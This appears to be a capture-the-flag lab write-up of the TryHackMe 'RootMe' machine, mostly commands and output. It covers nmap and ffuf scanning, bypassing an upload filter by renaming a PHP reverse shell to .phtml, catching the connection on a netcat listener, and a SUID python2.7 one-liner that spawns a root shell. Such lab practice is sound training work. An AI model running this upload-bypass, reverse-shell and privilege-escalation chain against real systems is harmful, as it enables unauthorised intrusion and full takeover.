## MACHINE IP
```bash
10.10.255.165
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Tue Sep 30 14:56:13 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.10.255.165
Nmap scan report for 10.10.255.165
Host is up (0.36s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fc:7f:d7:8a:98:95:66:d3:95:42:95:c5:fd:7d:4b:46 (RSA)
|   256 40:47:b5:4a:b1:c0:7b:d3:7a:49:26:d7:a4:d5:45:09 (ECDSA)
|_  256 13:5b:a4:9d:6c:88:99:bc:20:d3:49:b7:d3:d7:2c:da (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 30 14:57:21 2025 -- 1 IP address (1 host up) scanned in 67.73 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
## RECON
```bash
# Operating System               // Found Post Enumeration
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
```
## ENUMERATION
```bash
# Port 80 Enumeration
- Fuzzing
  
sudo ffuf -r -c -w /usr/share/wordlists/dirb/common.txt -fc 404 -u $url/FUZZ | tee fuzz/ffuf-common 
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 352ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1727ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3736ms]
                        [Status: 200, Size: 616, Words: 115, Lines: 26, Duration: 3748ms]
css                     [Status: 200, Size: 1126, Words: 70, Lines: 18, Duration: 354ms]
index.php               [Status: 200, Size: 616, Words: 115, Lines: 26, Duration: 353ms]
js                      [Status: 200, Size: 959, Words: 65, Lines: 17, Duration: 353ms]
panel                   [Status: 200, Size: 732, Words: 175, Lines: 23, Duration: 389ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 352ms]
uploads                 [Status: 200, Size: 744, Words: 52, Lines: 16, Duration: 353ms]

- Accessing http://10.10.255.165/panel/
- Can upload file  
- Try upload php revere shell 
  
cp /usr/share/laudanum/php/php-reverse-shell.php ./shell.php

- Edit LHOST LPORT  
- upload http://10.10.255.165/uploads/ and checking  !!! FAILED no file was uploaded
  
- Changing the file extension to shell.phtml
- !!! Success able to  view the file shell.phtml on http://10.10.255.165/uploads/
```
## INITIAL SHELL
```bash
- Start a listener

curl http://10.10.255.165/uploads/shell.phtml

sudo nc -nvlp 80                                                                          
[sudo] password for kali:                                                                     
listening on [any] 80 ...                                                                     
connect to [10.13.80.25] from (UNKNOWN) [10.10.255.165] 46728                                 
Linux ip-10-10-255-165 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:41:02 up 15 min,  0 users,  load average: 0.00, 0.01, 0.02                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                         
/bin/sh: 0: can't access tty; job control turned off
$ id                                                                                          
uid=33(www-data) gid=33(www-data) groups=33(www-data)  

# Upgrade Shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'                                             
www-data@ip-10-10-255-165:/$ ^Z                                                               
zsh: suspended  sudo nc -nvlp 80                                                              
                                               
┌──(kali㉿kali)-[~/Desktop/TryHackMe/LinuxMachines/09-RootMe]
└─$ stty raw -echo; fg                                                                        
                                                                                              
[1]  + continued  sudo nc -nvlp 80                                                            
                                                                                              
www-data@ip-10-10-255-165:/$ stty rows 48 cols 189                                            
www-data@ip-10-10-255-165:/$ export TERM=xterm-256color                                       
www-data@ip-10-10-255-165:/$ alias ll='ls -lsaht --color=auto'                                
www-data@ip-10-10-255-165:/$ PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '
```
## PRIVILEGE ESCALATION
```bash
# SUID
www-data@ip-10-10-255-165:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/python2.7
```
## ROOT | ADMINISTRATOR - PWNED
```bash
www-data@ip-10-10-255-165:/$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'                                                                                              
# id                                                                                          
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)                            
# whoami                                                                                      
root                              
```
